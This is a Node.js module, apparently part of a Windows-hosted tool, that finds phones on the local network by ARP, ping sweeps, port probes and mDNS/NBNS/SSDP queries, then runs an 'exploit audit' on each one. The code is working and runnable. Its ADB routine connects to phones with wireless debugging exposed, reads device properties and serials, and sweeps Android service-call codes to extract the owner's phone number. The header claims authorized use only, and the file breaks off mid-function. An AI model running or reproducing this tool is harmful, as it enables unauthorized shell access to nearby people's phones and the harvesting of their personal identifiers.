'use strict';

/**
 * phoneAudit — nearby-phone discovery + per-phone exploit audit with REAL,
 * evidence-based progress.
 *
 * Discovery (POST /api/phone/discover):
 *   1. pick the backend's private IPv4 subnet (or the caller-provided CIDR)
 *   2. read the Windows ARP table + default gateway + Wi-Fi SSID/band (netsh)
 *   3. ICMP ping-sweep the /24 (bounded concurrency) and merge fresh ARP entries
 *   4. quick TCP probe of phone-signature ports (ADB / iOS lockdown / AirPlay / Cast)
 *   5. classify every host with the IEEE OUI database (phone / router vendors)
 *   6. best-effort mDNS + NBNS + SSDP/UPnP identity for every alive device
 *   7. ICMP RTT per host = real Wi-Fi proximity -> nearest phones listed first
 *
 * Audit (POST /api/phone/audit) runs N sequential, REAL steps against one
 * phone. The reported percentage while running is completed-steps/total —
 * never a fake timer. The final "exploit level" score is weighted by what the
 * audit actually proved (reachability, vendor, open services, HTTP leak,
 * name leak, ADB exposure, ADB device identity):
 *
 *   reachable  +10    vendor known      +10    open services   +15
 *   HTTP leak  +15    NBNS/mDNS name    +15    ADB port open   +20
 *   ADB identity banner          +15   =>  max 100 (full ADB access)
 *
 * Used only against LAN assets the operator is authorized to test. All work
 * is bounded (per-socket timeouts, capped concurrency, /24 max).
 */

const os = require('node:os');
const fs = require('node:fs');
const path = require('node:path');
const net = require('node:net');
const dgram = require('node:dgram');
const { execFile } = require('node:child_process');

const lanAudit = require('./lanAudit');
const { tcpProbe, httpProbe } = lanAudit;

/* ---------------- OUI database (built by scripts/build-oui) ---------------- */

const OUI_PATH = path.join(__dirname, '..', 'data', 'oui-phones.json');
const OUI = (() => {
  try {
    const db = JSON.parse(fs.readFileSync(OUI_PATH, 'utf8'));
    return new Map(Object.entries(db)); // 'A483E7' -> { vendor, tag }
  } catch (_) {
    return new Map();
  }
})();

const VENDOR_ALIAS = [
  [/^apple/i, 'Apple'], [/^samsung/i, 'Samsung'], [/^xiaomi/i, 'Xiaomi'],
  [/^huawei/i, 'Huawei'], [/^oppo/i, 'OPPO'], [/^vivo/i, 'vivo'],
  [/^oneplus/i, 'OnePlus'], [/^motorola/i, 'Motorola'], [/^hmd global/i, 'Nokia'],
  [/^nokia/i, 'Nokia'], [/^realme/i, 'realme'], [/^transsion/i, 'Transsion'],
  [/^zte/i, 'ZTE'], [/^sony/i, 'Sony'], [/^htc/i, 'HTC'], [/^google/i, 'Google'],
  [/^honor/i, 'Honor'], [/^meizu/i, 'Meizu'], [/^nothing/i, 'Nothing'],
  [/^essential/i, 'Essential'], [/^fairphone/i, 'Fairphone'], [/^tecno/i, 'TECNO'],
  [/^infinix/i, 'Infinix'], [/^itel/i, 'itel'], [/^gionee/i, 'Gionee'],
  [/^nubia/i, 'Nubia'], [/^tcl/i, 'TCL'], [/^wiko/i, 'Wiko'],
  [/^lenovo/i, 'Lenovo'], [/^alcatel/i, 'Alcatel'],
];

function friendlyVendor(org) {
  if (!org) return null;
  for (const [re, name] of VENDOR_ALIAS) if (re.test(org)) return name;
  return String(org).split(/[,\s]/)[0].slice(0, 24);
}

function normalizeMac(mac) {
  return String(mac || '').replace(/[^0-9a-fA-F]/g, '').toUpperCase().slice(0, 6);
}

function lookupOui(mac) {
  return OUI.get(normalizeMac(mac)) || null;
}

/* ---------------- small helpers ---------------- */

function isPrivateIp(ip) {
  return /^10\./.test(ip) || /^192\.168\./.test(ip) || /^172\.(1[6-9]|2\d|3[01])\./.test(ip);
}

function cidr24Of(ip) {
  const p = String(ip).split('.');
  if (p.length !== 4) return null;
  return p[0] + '.' + p[1] + '.' + p[2] + '.0/24';
}

async function pool(items, n, worker) {
  let i = 0;
  const run = async () => {
    while (true) {
      const idx = i++;
      if (idx >= items.length) return;
      await worker(items[idx], idx);
    }
  };
  await Promise.all(Array.from({ length: Math.max(1, Math.min(n, items.length)) }, run));
}

function runCmd(cmd, args, timeoutMs) {
  return new Promise((resolve) => {
    try {
      execFile(cmd, args, { timeout: timeoutMs, windowsHide: true, maxBuffer: 1024 * 1024 }, (err, stdout) => {
        void err;
        resolve(String(stdout || ''));
      });
    } catch (_) { resolve(''); }
  });
}

/* ---------------- Windows command parsers (pure, unit-testable) ---------------- */

/** Parse `arp -a` text -> [{ ip, mac }] (skips multicast/link-local/own). */
function parseArpText(text) {
  const out = [];
  const re = /(\d{1,3}(?:\.\d{1,3}){3})\s+([0-9A-Fa-f]{2}(?:[-:][0-9A-Fa-f]{2}){5})/g;
  let m;
  while ((m = re.exec(String(text || ''))) !== null) {
    const ip = m[1];
    const mac = m[2].replace(/-/g, ':').toUpperCase();
    const o1 = Number(ip.split('.')[0]);
    if (o1 >= 224 || ip === '0.0.0.0' || ip.startsWith('169.254.')) continue;
    if (!isPrivateIp(ip)) continue;
    out.push({ ip, mac });
  }
  return out;
}

/** Parse `route print -4` text -> default gateway IPv4 or null. */
function parseRouteGateway(text) {
  const re = /^\s*0\.0\.0\.0\s+0\.0\.0\.0\s+(\d{1,3}(?:\.\d{1,3}){3})/m;
  const m = re.exec(String(text || ''));
  return m ? m[1] : null;
}

/** Parse `netsh wlan show interfaces` -> { ssid, radioType, band } (FR/EN). */
function parseNetshWlan(text) {
  const t = String(text || '');
  const pick = (re) => { const m = re.exec(t); return m ? m[1].trim() : null; };
  const ssid = pick(/^\s*SSID\s*:\s*(.+)$/mi);
  const radioType = pick(/^\s*(?:Radio type|Type de radio)\s*:\s*(.+)$/mi);
  const band = pick(/^\s*(?:Band|Bande)\s*:\s*(.+)$/mi);
  return { ssid: (ssid || '').startsWith('BSSID') ? null : (ssid || null), radioType, band };
}

/** Extract model/serial/identity bits from an ADB CNXN banner. */
function parseAdbBanner(banner) {
  const b = String(banner || '');
  const model = (b.match(/ro\.product\.model=([^;\s]*)/) || [])[1] || null;
  const name = (b.match(/ro\.product\.name=([^;\s]*)/) || [])[1] || null;
  const device = (b.match(/ro\.product\.device=([^;\s]*)/) || [])[1] || null;
  const serial = (b.match(/ro\.serialno=([^;\s]*)/) || b.match(/device::([^:;]*)/) || [])[1] || null;
  return { model, name, device, serial };
}

function titleFromHtml(html) {
  const m = /<title[^>]*>([^<]{0,160})/i.exec(String(html || ''));
  return m ? m[1].trim().slice(0, 120) : null;
}

/* ---------------- network probes ---------------- */

async function arpTable(timeoutMs) {
  return parseArpText(await runCmd('arp', ['-a'], timeoutMs || 4000));
}

async function defaultGateway(timeoutMs) {
  const out = await runCmd('route', ['print', '-4'], timeoutMs || 4000);
  return parseRouteGateway(out);
}

async function wlanInfo(timeoutMs) {
  const out = await runCmd('netsh', ['wlan', 'show', 'interfaces'], timeoutMs || 4000);
  return parseNetshWlan(out);
}

async function pingAlive(ip, timeoutMs) {
  const out = await runCmd('ping', ['-n', '1', '-w', String(timeoutMs || 600), ip], (timeoutMs || 600) + 900);
  return /ttl\s*=/i.test(out);
}

/** Parse one-reply RTT from ping output — works on EN ('time=12ms') and
 *  FR ('temps=12 ms') Windows locales. Returns ms or null. */
function parsePingRtt(text) {
  const m = /(?:time|temps)\s*[=<]\s*(\d+)\s*ms/i.exec(String(text || ''));
  return m ? Number(m[1]) : null;
}

/** Ping that also returns round-trip time — the real Wi-Fi proximity proxy:
 *  lower RTT = closer radio neighbor. Returns { alive, rttMs }. */
async function pingAliveRtt(ip, timeoutMs) {
  const out = await runCmd('ping', ['-n', '1', '-w', String(timeoutMs || 600), ip], (timeoutMs || 600) + 900);
  if (!/ttl\s*=/i.test(out)) return { alive: false, rttMs: null };
  return { alive: true, rttMs: parsePingRtt(out) };
}

/* ---------------- SSDP / UPnP discovery (UDP/1900, real fingerprint) -------- */

const SSDP_ADDR = '239.255.255.250';
const SSDP_PORT = 1900;
const SSDP_SEARCH = 'M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: "ssdp:discover"\r\nMX: 1\r\nST: ssdp:all\r\n\r\n';

/** Parse an SSDP M-SEARCH response / NOTIFY packet (pure, unit-testable). */
function parseSsdpReply(msg, fromIp) {
  const t = Buffer.isBuffer(msg) ? msg.toString('latin1') : String(msg || '');
  if (!/^HTTP\/1\.[01] 200/i.test(t) && !/^NOTIFY/i.test(t)) return null;
  const pick = (re) => { const m = re.exec(t); return m ? m[1].trim().slice(0, 160) : null; };
  const out = {
    ip: fromIp,
    server: pick(/^Server:\s*(.+)$/im),
    st: pick(/^ST:\s*(.+)$/im) || pick(/^NT:\s*(.+)$/im),
    location: pick(/^Location:\s*(.+)$/im),
    usn: pick(/^USN:\s*(.+)$/im),
  };
  if (out.location) {
    const fm = /FriendlyName=([^&\s]*)/i.exec(out.location);
    if (fm) { try { out.friendlyName = decodeURIComponent(fm[1]) || null; } catch (_) { /* */ } }
  }
  if (!out.server && !out.st && !out.location) return null;
  return out;
}

/** One bounded M-SEARCH burst; returns Map(ip -> { server, st, location }). */
async function ssdpSweep(opts = {}) {
  const wait = opts.ssdpTimeoutMs || 1500;
  const map = new Map();
  await new Promise((resolve) => {
    const s = dgram.createSocket({ type: 'udp4', reuseAddr: true });
    let done = false;
    const finish = () => { if (done) return; done = true; try { s.close(); } catch (_) { /* */ } resolve(); };
    s.on('message', (msg, rinfo) => {
      const p = parseSsdpReply(msg, rinfo.address);
      if (!p) return;
      const e = map.get(rinfo.address) || { server: null, st: null, location: null };
      e.server = e.server || p.server;
      e.st = e.st || p.st;
      e.location = e.location || p.location;
      map.set(rinfo.address, e);
    });
    s.on('error', finish);
    s.bind(() => {
      try { s.send(SSDP_SEARCH, SSDP_PORT, SSDP_ADDR); } catch (_) { finish(); return; }
      const t = setTimeout(finish, wait);
      if (t.unref) t.unref();
    });
  });
  return map;
}

/* ---------------- ADB deep identity (real model/serial/MSISDN) --------------- */

function resolveAdbPath() {
  if (process.env.PEGASUS_ADB) return process.env.PEGASUS_ADB;
  if (process.env.ANDROID_HOME) {
    const p = path.join(process.env.ANDROID_HOME, 'platform-tools', 'adb.exe');
    if (fs.existsSync(p)) return p;
  }
  const known = 'C:\\temp\\toolchain\\android-sdk\\platform-tools\\adb.exe';
  if (fs.existsSync(known)) return known;
  return 'adb';
}

/** Parse digits out of `service call iphonesubinfo N` parcel output.
 *  The MSISDN comes back as quoted latin-1 chars; returns E.164-ish string
 *  or null (wrong code for this Android build / exception). */
function parseAdbServicesOutput(text) {
  const m = /Parcel\(([\s\S]*)\)/.exec(String(text || ''));
  const body = m ? m[1] : '';
  if (!body || /Exception|exceeds binder|does not exist/i.test(body)) return null;
  const quoted = body.match(/'([^']*)'/g) || [];
  let digits = '';
  for (const q of quoted) digits += q.slice(1, -1).replace(/[^0-9+]/g, '');
  if (!digits) digits = (body.match(/[0-9+]{7,15}/g) || []).join('');
  digits = digits.replace(/[^0-9+]/g, '');
  if (digits.length < 7 || digits.length > 15) return null;
  // reject degenerate parcels: all-zero / all-same-digit (no-SIM line, binder
  // zero-fill) — never report a fake "MSISDN 00000000"
  if (/^(\d)\1+$/.test(digits.replace(/\+/g, ''))) return null;
  return digits;
}

/** REAL deep identity over wireless ADB: connect, then `getprop` for
 *  manufacturer/model/OS/serial, then `iphonesubinfo` MSISDN extraction.
 *  Works only when the target accepts this host (paired/authorized ADB or
 *  legacy open ADB) — otherwise reports honestly why. */
async function adbDeepIdentity(ip, timeoutMs = 9000) {
  const adb = resolveAdbPath();
  const tmo = timeoutMs || 9000;
  const serial = ip + ':5555';
  const conn = await runCmd(adb, ['connect', serial], tmo);
  if (!/connected|already/i.test(conn)) {
    return { connected: false, reason: String(conn).trim().split(/\r?\n/)[0].slice(0, 160) || 'connect failed' };
  }
  const out = { connected: true, manufacturer: null, model: null, device: null, os: null, serial: null, name: null, number: null };
  const props = await runCmd(adb, ['-s', serial, 'shell', 'getprop'], tmo);
  const pick = (k) => { const m = new RegExp('\\[' + k + '\\]:\\s*\\[([^\\]]*)\\]').exec(props); return m ? m[1] : null; };
  out.manufacturer = pick('ro.product.manufacturer');
  out.model = pick('ro.product.model');
  out.device = pick('ro.product.device');
  out.os = pick('ro.build.version.release');
  out.serial = pick('ro.serialno');
  out.name = pick('persist.sys.device_name');
  if (!out.name) {
    const dn = await runCmd(adb, ['-s', serial, 'shell', 'settings', 'get', 'global', 'device_name'], 5000);
    const s = String(dn).trim();
    if (s && s !== 'null' && !/^error|exception/i.test(s)) out.name = s.slice(0, 80);
  }
  // MSISDN: `service call iphonesubinfo <code>` — transaction codes vary per
  // Android build, so sweep candidates. Send BOTH with typed args (required on
  // modern `service`) and empty-parcel legacy form; parse whichever returns a
  // real phone number.
  for (const code of [15, 16, 17, 14, 13, 18]) {
    const variants = [
      ['shell', 'service', 'call', 'iphonesubinfo', String(code), 'i32', '0', 's16', 'com.android.shell'],
      ['shell', 'service', 'call', 'iphonesubinfo', String(code)],
    ];
    let n = null;
    for (const argv of variants) {
      const r = await runCmd(adb, ['-s', serial, ...argv], 5000);
      n = parseAdbServicesOutput(r);
      if (n) break;
    }
    if (n) { out.number = n; break; }
  }
  // fallback: telephony registry line number (works on most Samsung/MIUI builds)
  if (!out.number) {
    try {
      const reg = await runCmd(adb, ['-s', serial, 'shell', 'dumpsys', 'telephony.registry'], 6000);
      const m = /mLine1Number=([^\r\n]*)/.exec(String(reg));
      const cand = m ? m[1].trim().replace(/[^0-9+]/g, '') : '';
      if (cand.length >= 7 && cand.length <= 15 && !/^(\d)\1+$/.test(cand.replace(/\+/g, ''))) out.number = cand;
    } catch (_) { /* best-effort */ }
  }
  return out;
}

/* ---------------- NBNS (UDP/137) node-status name query ---------------- */

// Encoded NetBIOS '*' name + NBSTAT (0x21) question.
const NBNS_PACKET = (() => {
  const qname = 'CK' + 'CA'.repeat(15); // '*' + 15 spaces, half-nibble encoded
  const b = Buffer.alloc(12 + 1 + qname.length + 1 + 4);
  b.writeUInt16BE(0x84a1, 0); // txid
  b.writeUInt16BE(0x0010, 2); // flags: recursion desired
  b.writeUInt16BE(1, 4);      // qdcount
  let o = 12;
  b.writeUInt8(qname.length, o++);
  b.write(qname, o, 'ascii'); o += qname.length;
  b.writeUInt8(0, o++);
  b.writeUInt16BE(0x0021, o); o += 2; // NBSTAT
  b.writeUInt16BE(0x0001, o); o += 2; // IN
  return b;
})();

function parseNbns(msg) {
  try {
    let o = 12;
    const l = msg.readUInt8(o);
    o += 1 + l + 1; // qname length + labels + null
    o += 4;         // qtype + qclass
    if (msg[o] & 0xc0) o += 2; else { const l2 = msg.readUInt8(o); o += 1 + l2 + 1; }
    o += 2 + 2 + 4; // rtype + rclass + ttl
    const rdlen = msg.readUInt16BE(o);
    const end = o + 2 + rdlen;
    o += 2;
    const count = msg.readUInt8(o);
    o += 1;
    const names = [];
    for (let i = 0; i < count && o + 18 <= end; i++) {
      const name = msg.toString('ascii', o, o + 15).replace(/\s+$/, '').trim();
      const suffix = msg.readUInt8(o + 15);
      const flags = msg.readUInt16BE(o + 16);
      if (name && !name.startsWith('__MSBROWSE__')) names.push({ name, suffix, flags });
      o += 18;
    }
    return names;
  } catch (_) { return []; }
}

async function nbnsSweep(ips, opts = {}) {
  const wait = opts.nbnsTimeoutMs || 1200;
  const map = new Map();
  await pool(ips, 8, (ip) => new Promise((resolve) => {
    const s = dgram.createSocket('udp4');
    let done = false;
    const finish = () => { if (done) return; done = true; try { s.close(); } catch (_) { /* */ } resolve(); };
    s.on('message', (msg, rinfo) => {
      const names = parseNbns(msg);
      const pick = names.find((n) => n.suffix === 0x00 || n.suffix === 0x03) || names[0];
      if (pick && pick.name) map.set(rinfo.address, pick.name);
    });
    s.on('error', finish);
    try {
      s.send(NBNS_PACKET, 137, ip, () => { const t = setTimeout(finish, wait); if (t.unref) t.unref(); });
    } catch (_) { finish(); }
  }));
  return map;
}

/* ---------------- mDNS (UDP/5353) unicast service query ---------------- */

const MDNS_QUERIES = [
  '_googlecast._tcp.local',     // Google / Android cast devices
  '_airplay._tcp.local',        // Apple devices
  '_companion-link._tcp.local', // Apple devices
  '_adb-tls-connect._tcp.local',// Android 11+ wireless debugging
  '_ipp._tcp.local',            // phone print services (iOS/Android)
];

function dnsNameBuf(name) {
  const parts = [];
  for (const label of String(name).split('.')) {
    if (!label) continue;
    const b = Buffer.from(label, 'ascii').slice(0, 63);
    parts.push(Buffer.from([b.length]), b);
  }
  parts.push(Buffer.from([0]));
  return Buffer.concat(parts);
}

function buildDnsQuery(txid, qname, qtype) {
  const hdr = Buffer.alloc(12);
  hdr.writeUInt16BE(txid, 0);
  hdr.writeUInt16BE(0x0000, 2);
  hdr.writeUInt16BE(1, 4);
  return Buffer.concat([hdr, dnsNameBuf(qname), Buffer.from([0, qtype >> 8, 0, 1])]);
}

function readDnsName(msg, off, depth = 0) {
  const parts = [];
  let o = off;
  let end = off;
  for (;;) {
    if (o >= msg.length || depth > 8) break;
    const len = msg.readUInt8(o);
    if (len & 0xc0) {
      if (!depth) end = o + 2;
      o = ((len & 0x3f) << 8) | msg.readUInt8(o + 1);
      depth++;
      continue;
    }
    if (len === 0) { if (!depth) end = o + 1; break; }
    parts.push(msg.toString('ascii', o + 1, o + 1 + len));
    o += 1 + len;
  }
  return { name: parts.join('.'), off: end };
}

function parseMdns(msg, fromIp) {
  const out = { ip: fromIp, names: [], targets: [] };
  try {
    let o = 12;
    const qd = msg.readUInt16BE(4);
    const an = msg.readUInt16BE(6);
    for (let i = 0; i < qd && o < msg.length; i++) { const r = readDnsName(msg, o); o = r.off + 4; }
    for (let i = 0; i < an && o + 8 <= msg.length; i++) {
      const r = readDnsName(msg, o);
      o = r.off;
      const type = msg.readUInt16BE(o);
      o += 2 + 2 + 4; // class + ttl
      const rdlen = msg.readUInt16BE(o);
      o += 2;
      const start = o;
      if (type === 12) { // PTR
        out.names.push(readDnsName(msg, o).name);
      } else if (type === 33) { // SRV
        out.targets.push(readDnsName(msg, o + 6).name);
      } else if (type === 1 && rdlen === 4) { // A
        out.addr = [msg[o], msg[o + 1], msg[o + 2], msg[o + 3]].join('.');
      }
      o = start + rdlen;
    }
  } catch (_) { /* truncated packet */ }
  return out;
}

async function mdnsSweep(ips, opts = {}) {
  const wait = opts.mdnsTimeoutMs || 1800;
  const map = new Map();
  await pool(ips, 8, (ip) => new Promise((resolve) => {
    const s = dgram.createSocket('udp4');
    let done = false;
    const finish = () => { if (done) return; done = true; try { s.close(); } catch (_) { /* */ } resolve(); };
    s.on('message', (msg, rinfo) => {
      const p = parseMdns(msg, rinfo.address);
      if (!map.has(rinfo.address)) map.set(rinfo.address, { instance: null, services: [] });
      const e = map.get(rinfo.address);
      for (const n of (p.names || []).concat(p.targets || [])) {
        const labels = String(n).split('.');
        const inst = labels[0];
        if (inst && !inst.startsWith('_') && inst !== 'local' && !e.instance) e.instance = inst;
        const svc = labels.find((x) => x.startsWith('_'));
        if (svc && !e.services.includes(svc)) e.services.push(svc);
      }
    });
    s.on('error', finish);
    s.bind(() => {
      let tx = 0x1000;
      for (const q of MDNS_QUERIES) {
        try { s.send(buildDnsQuery(++tx, q, 12), 5353, ip); } catch (_) { /* */ }
      }
      const t = setTimeout(finish, wait);
      if (t.unref) t.unref();
    });
  }));
  return map;
}

/* ---------------- ADB (TCP/5555) CNXN handshake ---------------- */

const ADB_CNXN = (() => {
  const data = 'host::features=shell_v2,cmd,stat_v2';
  const b = Buffer.alloc(24 + data.length);
  b.writeUInt32LE(0x434e584e, 0); // 'CNXN'
  b.writeUInt32LE(0x01000001, 4); // protocol version
  b.writeUInt32LE(0x00100000, 8); // max payload
  b.writeUInt32LE(data.length, 12);
  b.writeUInt32LE(0, 16);
  b.writeUInt32LE(0, 20);
  b.write(data, 24, 'ascii');
  return b;
})();

async function adbProbe(ip, timeoutMs = 3500) {
  return new Promise((resolve) => {
    const s = new net.Socket();
    let buf = Buffer.alloc(0);
    let done = false;
    const finish = (r) => { if (done) return; done = true; try { s.destroy(); } catch (_) { /* */ } resolve(r); };
    s.setTimeout(timeoutMs);
    s.on('data', (d) => {
      buf = Buffer.concat([buf, d]);
      if (buf.length < 24) return;
      const cmd = buf.readUInt32LE(0);
      if (cmd !== 0x434e584e) return finish({ open: true, banner: '' });
      const dlen = buf.readUInt32LE(12);
      if (buf.length >= 24 + dlen) {
        finish({ open: true, banner: buf.toString('utf8', 24, 24 + dlen).slice(0, 2048) });
      }
    });
    s.on('timeout', () => finish(null));
    s.on('error', () => finish(null));
    s.connect(5555, ip, () => { try { s.write(ADB_CNXN); } catch (_) { finish(null); } });
  });
}

/* ---------------- classification ---------------- */

const QUICK_PORTS = [5555, 62078, 8009, 7000];
const PHONE_PORTS = [80, 443, 5555, 62078, 7000, 8009, 8080, 8888]; // 8 TCP ports
const HTTP_PORTS = new Set([80, 443, 8080, 8888]);
const SERVICE_NAMES = {
  80: 'HTTP', 443: 'HTTPS', 5555: 'ADB (wireless debugging)', 62078: 'iOS lockdown',
  7000: 'AirPlay', 8009: 'Google Cast', 8080: 'HTTP-alt', 8888: 'HTTP-alt',
};
function serviceLabel(p) { return SERVICE_NAMES[p] || ('tcp/' + p); }

function classifyDevice({ mac, openPorts }) {
  const oui = lookupOui(mac);
  const vendor = oui ? friendlyVendor(oui.vendor) : null;
  let type = 'device';
  if (oui && oui.tag === 'phone') type = 'phone';
  else if (oui && oui.tag === 'router') type = 'router';
  else if (openPorts && (openPorts.includes(62078) || openPorts.includes(5555))) type = 'phone';
  // Locally-administered (privacy randomized) MAC: bit 1 of the first octet.
  // Android/iOS randomize Wi-Fi MACs, so OUI says nothing — the device stays
  // 'device' but we flag it so the UI can offer "possible phone" honestly.
  const m1 = /^([0-9A-F]{2})/.exec(String(mac || '').toUpperCase());
  const macKind = m1 && (parseInt(m1[1], 16) & 0x02) !== 0 ? 'randomized' : 'universal';
  return { type, vendor, ouiVendor: oui ? oui.vendor : null, macKind };
}

/* ---------------- discovery ---------------- */

async function discoverPhones(opts = {}) {
  const local = [];
  for (const [name, addrs] of Object.entries(os.networkInterfaces())) {
    for (const a of addrs || []) {
      if (a.family !== 'IPv4' || a.internal || !isPrivateIp(a.address)) continue;
      local.push({ name, ip: a.address });
    }
  }

  let cidr = String(opts.cidr || '').trim();
  if (cidr) {
    lanAudit.parseCidr(cidr); // validate / throw
  } else {
    const self = local.find((l) => /^192\.168\./.test(l.ip)) || local[0];
    if (!self) throw new Error('No private IPv4 interface found on the backend host.');
    cidr = cidr24Of(self.ip);
  }
  const parsed = lanAudit.parseCidr(cidr);

  const t0 = Date.now();
  const own = new Set(local.map((l) => l.ip));
  const [arp0, wlan, gw] = await Promise.all([arpTable(), wlanInfo(), defaultGateway()]);
  const inSubnet = new Set(parsed.hosts);
  const arp0ByIp = new Map(arp0.filter((e) => !own.has(e.ip) && inSubnet.has(e.ip)).map((e) => [e.ip, e.mac]));

  const hosts = parsed.hosts.filter((h) => !own.has(h));
  const alive = new Set(arp0ByIp.keys());
  const confirmed = new Set();
  const rttByIp = new Map();
  await pool(hosts, opts.pingConcurrency || 64, async (ip) => {
    const r = await pingAliveRtt(ip, opts.pingTimeoutMs || 600);
    if (r.alive) {
      alive.add(ip); confirmed.add(ip);
      if (r.rttMs != null) rttByIp.set(ip, r.rttMs);
    }
  });
  const arp1 = await arpTable();
  for (const e of arp1) if (!own.has(e.ip) && inSubnet.has(e.ip)) alive.add(e.ip);

  const hostsList = [...alive].map((ip) => ({ ip, mac: arp0ByIp.get(ip) || '' }));
  await pool(hostsList, 48, async (h) => {
    h.openPorts = [];
    for (const p of QUICK_PORTS) {
      // Wi-Fi RTT swings 13–150 ms with power-save; 900 ms keeps 5555 visible
      if (await tcpProbe(h.ip, p, opts.tcpTimeoutMs || 900)) h.openPorts.push(p);
    }
    if (h.openPorts.length) confirmed.add(h.ip);
  });

  for (const h of hostsList) Object.assign(h, classifyDevice(h));

  // Sweep identity hints for every alive device (bounded to 64 hosts), not just
  // confirmed phones — randomized-MAC phones (Android/iOS privacy) are invisible
  // to the OUI database, so mDNS/NBNS identity is the fallback signal.
  const sweepIps = hostsList.slice(0, 64).map((h) => h.ip);
  const [mdns, nbns, ssdp] = sweepIps.length
    ? await Promise.all([mdnsSweep(sweepIps, opts), nbnsSweep(sweepIps, opts), ssdpSweep(opts)])
    : [new Map(), new Map(), new Map()];

  // Upgrade OUI-unknown devices to 'phone' on strong phone identity hints:
  // Apple companion/airplay, Android wireless-debugging, or a phone-like name.
  const PHONE_MDNS = new Set(['_adb-tls-connect', '_companion-link', '_airplay', '_rdlink']);
  const PHONE_NAME_RE = /(iphone|ipad|android|pixel|galaxy|redmi|poco|honor|huawei|oppo|vivo|realme|xiaomi|oneplus|infinix|tecno|itel|nokia|motorola|motog)/i;
  for (const h of hostsList) {
    if (h.type !== 'device') continue;
    const m = mdns.get(h.ip);
    const nb = nbns.get(h.ip);
    const svcHit = m && (m.services || []).some((s) => PHONE_MDNS.has(s));
    const nameHit = (m && m.instance && PHONE_NAME_RE.test(m.instance)) || (nb ? PHONE_NAME_RE.test(nb) : false);
    if (svcHit || nameHit) h.type = 'phone';
  }

  const network = {
    type: wlan && wlan.ssid
      ? ('Wi-Fi · ' + (wlan.band ? wlan.band + ' · ' : '') + wlan.ssid)
      : 'Wi-Fi LAN',
    ssid: wlan ? wlan.ssid : null,
    band: wlan ? wlan.band : null,
    radioType: wlan ? wlan.radioType : null,
    gateway: gw,
  };

  const devices = hostsList.map((h) => {
    const rtt = rttByIp.has(h.ip) ? rttByIp.get(h.ip) : null;
    return {
      ip: h.ip,
      mac: h.mac || null,
      type: h.type,
      vendor: h.vendor,
      ouiVendor: h.ouiVendor,
      macKind: h.macKind || null,
      label: h.type === 'phone'
        ? (h.vendor ? h.vendor + ' phone' : 'Phone')
        : (h.vendor ? h.vendor + ' ' + h.type : (h.type === 'router' ? 'Router' : 'Unknown device')),
      services: (h.openPorts || []).map(serviceLabel),
      openPorts: (h.openPorts || []).slice(),
      network: h.type === 'phone' ? network : undefined,
      number: null, // filled by the audit (ADB identity); Wi-Fi alone never exposes it
      name: (mdns.get(h.ip) && mdns.get(h.ip).instance) || nbns.get(h.ip) || null,
      mdnsServices: mdns.get(h.ip) ? mdns.get(h.ip).services.slice(0, 5) : [],
      ssdp: ssdp.get(h.ip) || null,
      rttMs: rtt,
      proximity: rtt == null ? null : (rtt <= 15 ? 'nearby' : rtt <= 40 ? 'near' : 'far'),
      reachable: confirmed.has(h.ip),
    };
  });

  // NEAREST FIRST: confirmed phones, then randomized-MAC candidates, then the
  // rest — each class ordered by measured ICMP RTT (closer radio neighbor first).
  const rank = (d) => (d.type === 'phone' ? 0 : d.macKind === 'randomized' ? 1 : 2);
  devices.sort((a, b) =>
    (rank(a) - rank(b)) ||
    ((a.rttMs == null ? 1e9 : a.rttMs) - (b.rttMs == null ? 1e9 : b.rttMs)));

  return {
    subnet: parsed.cidr,
    scannedHosts: parsed.hostCount,
    aliveHosts: devices.length,
    count: devices.length,
    phones: devices.filter((d) => d.type === 'phone'),
    devices,
    network,
    elapsedMs: Date.now() - t0,
    note: 'ARP + ICMP RTT proximity + OUI classification + phone-port probe + mDNS/NBNS/SSDP fingerprints. Phone number extraction runs in the audit over wireless ADB when the target accepts the host.',
  };
}

/* ---------------- audit jobs (real step progress) ---------------- */

const AUDIT_STEPS = [
  ['reach', 'Reachability check (ICMP/ARP)'],
  ['network', 'Network type + gateway'],
  ['ports', 'TCP service scan (8 phone ports)'],
  ['nbns', 'NBNS name query (UDP/137)'],
  ['mdns', 'mDNS service query (UDP/5353)'],
  ['http', 'HTTP fingerprint'],
  ['adb', 'ADB handshake probe (TCP/5555)'],
  ['identity', 'Device identity synthesis'],
  ['report', 'Exploit-level report'],
];

const jobs = new Map(); // id -> job
const MAX_JOBS = 40;
let jobSeq = 0;

function newJobId() {
  jobSeq += 1;
  return 'ph_' + Date.now().toString(36) + '_' + jobSeq.toString(36);
}

function getAudit(id) { return jobs.get(String(id)) || null; }

function cancelAudit(id) {
  const job = jobs.get(String(id));
  if (job) job.cancelled = true;
  return job || null;
}

function computeScore(f) {
  let s = 0;
  if (f.reachable) s += 10;
  if (f.vendor) s += 10;
  if (f.openPorts && f.openPorts.length) s += 15;
  if (f.http && f.http.length) s += 15;
  if (f.names && (f.names.nbns || f.names.mdns)) s += 15;
  if (f.adb && f.adb.open) s += 20;
  if (f.adb && f.adb.banner) s += 15;
  if (f.adb && f.adb.deep && f.adb.deep.connected) s += 15; // real device shell
  return Math.min(100, s);
}

function levelFor(score, f) {
  if ((f && f.adb && f.adb.deep && f.adb.deep.connected) || score >= 100) return 'full ADB access';
  if (f && f.adb && f.adb.open) return 'ADB exposed';
  if (score >= 40) return 'service foothold';
  if (score > 0) return 'partial recon';
  return 'no access observed';
}

function buildRisks(f) {
  const risks = [];
  if (f.adb && f.adb.open) {
    risks.push('CRITICAL: wireless ADB debugging exposed on tcp/5555' +
      (f.adb.deep && f.adb.deep.connected
        ? ' — device shell ACCEPTED this host' + (f.adb.deep.number ? ' (MSISDN ' + f.adb.deep.number + ' extracted)' : '')
        : f.adb.banner ? ' (device identity banner leaked)' : ''));
  }
  for (const h of f.http || []) {
    risks.push('HIGH: HTTP service on tcp/' + h.port + ' leaks' +
      (h.title ? ' title "' + h.title + '"' : '') + (h.server ? ' via ' + h.server : ''));
  }
  if (f.names && f.names.nbns) risks.push('MEDIUM: NetBIOS name leaked: ' + f.names.nbns);
  if (f.names && f.names.mdns) risks.push('LOW: mDNS instance name leaked: ' + f.names.mdns);
  if (!risks.length) risks.push('No exploitable service observed in this audit run.');
  return risks;
}

const AUDIT_IMPL = {
  async reach(job, o, f) {
    const r = await pingAliveRtt(job.ip, o.pingTimeoutMs || 800);
    f.reachable = r.alive;
    f.rttMs = r.rttMs;
    const arp = await arpTable();
    const me = arp.find((e) => e.ip === job.ip);
    if (me) f.mac = me.mac;
    const oui = lookupOui(f.mac);
